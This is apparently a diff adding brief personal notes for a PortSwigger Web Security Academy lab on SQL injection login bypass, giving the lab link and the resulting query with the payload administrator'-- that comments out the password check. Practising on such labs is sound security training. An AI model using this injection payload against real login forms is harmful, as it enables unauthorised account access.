@@ -1,0 +1,8 @@
+Lab #1 Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
+
+Assumptions:
+............
+
+username: administrator
+
+select * from users where username='administrator'--' and password=''
